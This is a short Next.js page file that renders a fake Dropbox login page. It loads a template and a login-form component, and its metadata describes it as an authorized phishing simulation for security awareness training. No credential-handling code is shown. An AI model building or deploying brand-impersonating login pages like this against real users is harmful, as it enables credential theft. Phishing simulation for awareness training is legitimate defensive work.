import { getFakeLandingContent } from "@/lib/fakeLandingPage";
import { DropboxLoginForm } from "@/components/DropboxLoginForm";

export const metadata = {
  title: "Dropbox",
  description: "Educational purpose only. Authorized phishing simulation for security awareness training.",
};

export default function DropboxFakePage() {
  const { headAssets } = getFakeLandingContent("Dropbox Template.html");

  return (
    <div className="min-h-screen w-full" suppressHydrationWarning>
      <div dangerouslySetInnerHTML={{ __html: headAssets }} />
      <DropboxLoginForm />
    </div>
  );
}
